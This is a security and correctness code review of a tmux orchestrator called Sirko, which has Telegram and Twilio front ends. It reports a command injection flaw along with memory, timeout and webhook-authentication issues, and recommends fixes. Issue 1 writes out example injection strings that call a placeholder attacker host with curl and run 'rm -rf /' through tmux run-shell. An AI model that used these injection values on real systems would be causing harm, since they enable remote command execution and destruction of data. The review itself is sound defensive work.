# Code Review: Sirko Tmux Orchestrator

**Verdict**: CONDITIONAL

**Summary**: The Sirko orchestrator codebase is a well-structured greenfield implementation with clean type-level domain modeling, a composable middleware pipeline, and solid test coverage. The architecture demonstrates strong separation of concerns across packages. However, there is one HIGH-severity command injection vulnerability in the tmux command interface, one HIGH-severity correctness issue with unsanitized input routing, and several MEDIUM-severity issues around unbounded resource growth and missing webhook authentication that should be addressed before production use.

---

## CRITICAL Issues (0)

No critical issues found.

---

## HIGH Issues (2)

### Issue 1: Command Injection via Unsanitized paneId in tmux Commands

- **Location**: `/Users/jack/mag/magai/sirko/packages/tmux-client/src/client.ts:111-148`
- **Problem**: All tmux command helpers interpolate `paneId`, `sessionId`, `windowId`, and user-provided `name` directly into command strings without validation or escaping, enabling tmux command injection.
- **Why problematic**: The `sendKeys`, `capturePane`, `getPanePid`, `newSession`, `newWindow`, and `newPane` methods construct commands like `` `send-keys -t ${paneId} ...` `` where `paneId` is a string. If an attacker (or corrupted state data from `state.json`) injects a value like `%1 ; run-shell "curl attacker.com"`, the tmux control-mode protocol will execute the injected command. The `newSession` method at line 131 is especially concerning: user-supplied `name` from the Telegram `/new` command (line 56 of `commands.ts`) flows directly into `new-session -d -s ${name}` -- a Telegram user could send `/new "foo; run-shell 'rm -rf /'"`. While `sanitizeForSendKeys` exists in `@sirko/shared`, it only strips control characters from the *text payload* of `send-keys -l`, NOT from the command structure itself (paneId, session names, etc.).
- **Impact**: Arbitrary command execution on the host machine via crafted tmux commands. An attacker with access to Telegram (or a corrupted `state.json`) could execute OS commands through tmux's `run-shell`.
- **Suggestion**: Validate all identifiers before interpolation. Pane IDs must match `/^%\d+$/`, session IDs `/^\$\d+$/`, window IDs `/^@\d+$/`. Session names should be validated against `/^[\w\-]+$/` (alphanumeric, hyphens, underscores only). Reject or escape any input that does not conform. Consider using `paneIdFromString()` (which already validates canonical form) as a gate before every command. Also, the `/kill` command at `commands.ts:78` passes user input directly to `sendCommand(`kill-pane -t ${paneId}`)` -- this needs the same validation.

### Issue 2: User Message Text Sent to tmux Without Sanitization

- **Location**: `/Users/jack/mag/magai/sirko/apps/telegram-bot/src/message-router.ts:37`
- **Problem**: The `MessageRouter.handle()` method forwards raw Telegram user message text to `tmuxClient.sendKeys(paneId, text)` without calling `sanitizeForSendKeys()`.
- **Why problematic**: The `sanitizeForSendKeys` utility exists in `@sirko/shared` specifically to strip control characters that could trigger unintended tmux key sequences. The `sendKeys` method in `client.ts` wraps text in `JSON.stringify()` (line 112) which provides some protection, but the purpose of `sanitizeForSendKeys` is to strip characters that could be problematic even after JSON encoding (e.g., `\x1b` escape sequences that may be interpreted by the shell inside the pane). The function exists but is never called in the only code path that accepts untrusted user input.
- **Impact**: A malicious Telegram user could inject escape sequences or control characters that affect the running CLI tool in unexpected ways -- potentially exiting an editor, sending interrupt signals, or altering terminal state.
- **Suggestion**: Call `sanitizeForSendKeys(text)` before passing text to `sendKeys` in `message-router.ts`. Apply the same sanitization in any future voice-to-text input path.

---

## MEDIUM Issues (3)

### Issue 3: Missing Twilio Webhook Signature Validation

- **Location**: `/Users/jack/mag/magai/sirko/apps/voice-server/src/voice-adapter.ts:218-269`
- **Problem**: The HTTP request handler in `VoiceAdapter.handleRequest()` does not validate Twilio webhook signatures before processing requests.
- **Why problematic**: The `TwilioTransport` class has a `validateSignature()` method (line 56 of `twilio-transport.ts`), but it is never called in the webhook handler. Any attacker who discovers the webhook URL can forge POST requests to `/twilio/voice` and `/twilio/status`, potentially initiating calls, manipulating call state, or causing the adapter to process spoofed events. The `authorizedNumbers` check only validates the `From` parameter (which is attacker-controlled in forged requests). Twilio's own documentation explicitly requires signature validation to prevent request forgery.
- **Impact**: Spoofed webhook requests could trigger unauthorized outbound calls (costing money), manipulate call state, or inject fake status updates that desynchronize the adapter's internal state.
- **Suggestion**: Call `transport.validateSignature(req.headers.get('X-Twilio-Signature'), url, params)` at the top of the `/twilio/voice` and `/twilio/status` handlers. Return 403 if validation fails.

### Issue 4: PaneSerializer Queue Map Grows Unbounded

- **Location**: `/Users/jack/mag/magai/sirko/apps/orchestrator/src/pane-serializer.ts:8-30`
- **Problem**: The `PaneSerializer.queue` Map accumulates entries for every pane that has ever been seen, and entries are never removed.
- **Why problematic**: Each entry in the `queue` Map holds a `Promise<void>`. Once a pane's promise chain completes, the entry remains in the Map pointing to a resolved promise. Over a long-running session with many panes being created and destroyed, this constitutes a memory leak. The `size` getter is exposed (line 27), suggesting awareness of this concern, but no eviction logic exists. In a production environment running for days/weeks, this could accumulate thousands of stale entries.
- **Impact**: Gradual memory growth proportional to the number of unique panes ever observed. Not catastrophic for short sessions, but problematic for always-on deployments.
- **Suggestion**: Clean up completed promise chains. After the `.catch()` handler in `runForPane`, check if the promise for this paneId has settled and delete the entry from the Map. Alternatively, subscribe to `PaneExited` events and call `this.queue.delete(paneId)`.

### Issue 5: Inflight Command Map Never Times Out in TmuxClient

- **Location**: `/Users/jack/mag/magai/sirko/packages/tmux-client/src/client.ts:17,99-108`
- **Problem**: The `sendCommand` method stores a `CommandInflight` entry in `this.inflight` and returns a Promise, but there is no timeout mechanism. If tmux crashes mid-command or the `%end`/`%error` response is lost, the Promise hangs forever.
- **Why problematic**: Any caller awaiting a `sendCommand` result (e.g., `getPanePid`, `capturePane`, `listPanes`) will hang indefinitely if the corresponding `%end` line is never received. This blocks the pipeline for that pane and can cascade -- `stateManagerMiddleware` calls `getPanePid` during pane creation (line 44 of `state-manager.ts`), meaning a lost response blocks all future events for new panes. The reconnection logic in `_scheduleReconnect` re-spawns the tmux process, but never cleans up stale inflight entries from the previous connection.
- **Impact**: Hung promises that block pipeline processing; potential deadlock of the orchestrator's event loop for affected panes.
- **Suggestion**: Add a configurable timeout (e.g., 10 seconds) to `sendCommand`. On timeout, reject the promise and delete the inflight entry. Also, in `_spawn()`, reject all existing inflight entries before reconnecting (they will never receive responses from the old connection).

---

## LOW Issues (2)

### Issue 6: BufferEmulator Accumulates Unbounded Text

- **Location**: `/Users/jack/mag/magai/sirko/packages/tmux-client/src/xterm-emulator.ts:63-91`
- **Problem**: `BufferEmulator.write()` appends every raw chunk to `this.buffer` without any size limit, and `getBuffer()` returns the entire accumulated string after stripping ANSI codes.
- **Why problematic**: For long-running panes with heavy output, this buffer grows without bound. The `XtermEmulator` (which uses `@xterm/headless`) has a natural bounded buffer (scrollback), but the `BufferEmulator` fallback does not. The `getBuffer()` return value is stored as `lastBufferSnapshot` on the pane state and passed to the detector engine, meaning very large strings flow through the pipeline.
- **Impact**: Memory growth for panes using the BufferEmulator fallback. Not critical since the XtermEmulator is the default when `@xterm/headless` is available.
- **Suggestion**: Add a maximum buffer size (e.g., 100KB) and truncate from the front when exceeded, similar to a terminal scrollback buffer.

### Issue 7: `sendKeys` Sends Empty String as "Enter Key" Without Newline

- **Location**: `/Users/jack/mag/magai/sirko/apps/telegram-bot/src/message-router.ts:39`
- **Problem**: After sending the user's text, `sendKeys(paneId, '')` is called as a comment says "Send Enter key separately", but sending an empty string via `send-keys -l ""` is a no-op in tmux -- it does not send Enter.
- **Why problematic**: The `sendKeys` method at `client.ts:112` wraps the text with `JSON.stringify()`, resulting in `send-keys -t %1 -l ""` which sends nothing. The user's text is already sent on the previous line, but without an explicit newline/Enter, the CLI tool in the pane does not receive a submission. The intent appears to be sending `\n`, but the implementation sends `""`.
- **Impact**: User messages sent from Telegram may not be submitted to the CLI tool (they appear in the terminal but Enter is never pressed), requiring the user to send a follow-up message.
- **Suggestion**: Change the empty-string call to `await this.tmuxClient.sendKeys(paneId, '\n')`, or use the skill's `inputSuffix` property (which is `'\n'` for all current skills) to append the correct suffix to the text before sending.

---

## Positive Observations

- **Strong type-level design**: The discriminated union for `SirkoEvent` and `TmuxEvent` provides exhaustive compile-time checking. The `Extract<SirkoEvent, { type: T }>` pattern in `AdapterSink` is idiomatic and safe.

- **Composable middleware pipeline**: The Koa-style `compose()` with double-call prevention is well-implemented and thoroughly tested. The pre/post execution pattern in `state-manager` middleware is clean.

- **Atomic state persistence**: The `StateStore.persist()` method uses write-to-tmp + rename, which is correct for atomic file replacement on POSIX systems. The backup file strategy adds resilience.

- **Defensive error handling**: The pipeline, event bus, and adapter layers all use error isolation patterns (try/catch, Promise.allSettled, fire-and-forget with `.catch()`) to prevent cascading failures. The `CircuitBreaker` for external APIs (Deepgram, ElevenLabs, OpenAI) is a strong production pattern.

- **Comprehensive test coverage**: Each package has focused unit tests with proper mocking boundaries. The orchestrator integration tests verify end-to-end dedup behavior and quiescence scheduling.

- **Clean package boundaries**: The monorepo structure with shared types in `@sirko/shared`, and the `TerminalEmulator` interface placed in shared (not tmux-client) to avoid circular deps, shows thoughtful architecture.

---

## Verdict Details

- **CRITICAL**: 0
- **HIGH**: 2
- **MEDIUM**: 3
- **LOW**: 2
- **Result**: CONDITIONAL -- 0 CRITICAL, 2 HIGH

**Recommendation**: Address the two HIGH issues (command injection and missing input sanitization) before merging to any branch that faces untrusted input. The command injection risk (Issue 1) is the most urgent -- add identifier validation to all `TmuxClient` command methods, and validate/sanitize the session name in the `/new` Telegram command. Issue 2 (sanitization of routed messages) is a single-line fix. The MEDIUM issues should be tracked for follow-up: webhook signature validation (Issue 3) before production Twilio deployment, and the inflight timeout (Issue 5) before any long-running production use.
